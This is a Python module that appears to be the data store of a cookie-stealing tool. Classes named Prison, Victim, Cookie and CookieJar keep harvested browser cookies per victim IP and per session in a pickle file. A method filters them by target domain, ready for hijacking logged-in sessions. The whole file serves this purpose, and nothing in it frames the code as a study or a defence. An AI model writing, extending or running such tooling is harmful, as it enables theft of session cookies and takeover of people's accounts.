import pickle
import os
from datetime import timezone, datetime


class Prison:
    def __init__(self, filename="prison.db") -> None:
        self.filename = filename
        self.victims = self._load_db() or self._create_db()

    def _create_db(self):
        with open(self.filename, "wb") as f:
            pickle.dump([], f)
        return []

    def _save_db(self):
        with open(self.filename, "wb") as f:
            pickle.dump(self.victims, f)

    def _load_db(self):
        if os.path.exists(self.filename):
            with open(self.filename, "rb") as f:
                return pickle.load(f)
        return False

    def add_victim(self, victim):
        if self._is_new_victim(victim):
            self.victims.append(victim)
        else:
            for existing_victim in self.victims:
                if existing_victim.ip == victim.ip:
                    break
            existing_victim.cookies.update(victim.cookies)

    def get_victim(self, ip):
        for victim in self.victims:
            if victim.ip == ip:
                return victim

    def _is_new_victim(self, new_victim):
        for victim in self.victims:
            if victim.ip == new_victim.ip:
                return False
        return True

    def from_domains(self, domains):
        result = {}
        for victim in self.victims:
            for (session, cookie_jar) in victim.cookies.items():
                cookies = cookie_jar.from_domains(domains)
                if cookies:
                    if victim.ip not in result:
                        result[victim.ip] = {}
                    result[victim.ip][session] = cookies
        return result


class Cookie:
    def __init__(self, name, value, domain) -> None:
        self.name = name
        self.value = value
        self.domain = domain

    def __str__(self) -> str:
        return self.domain


class CookieJar:
    def __init__(self, cookies: list[Cookie]) -> None:
        self.cookies = {}
        for cookie in cookies:
            if cookie.domain not in self.cookies:
                self.cookies[cookie.domain] = []
            self.cookies[cookie.domain].append(cookie)

    def from_domains(self, domains: list):
        result = []
        for domain in domains:
            if domain in self.cookies:
                result.append(self.cookies[domain])
        return result


class Victim:
    def __init__(self, ip_address, date=datetime.now(timezone.utc)) -> None:
        self.ip = ip_address
        self.date = date
        self.cookies = {}

    def get_date(self):
        return self.date.strftime("%d-%B-%Y (%H:%M:%S)")

    def update_cookies(self, cookie_jar, session_number):
        self.cookies[session_number] = cookie_jar
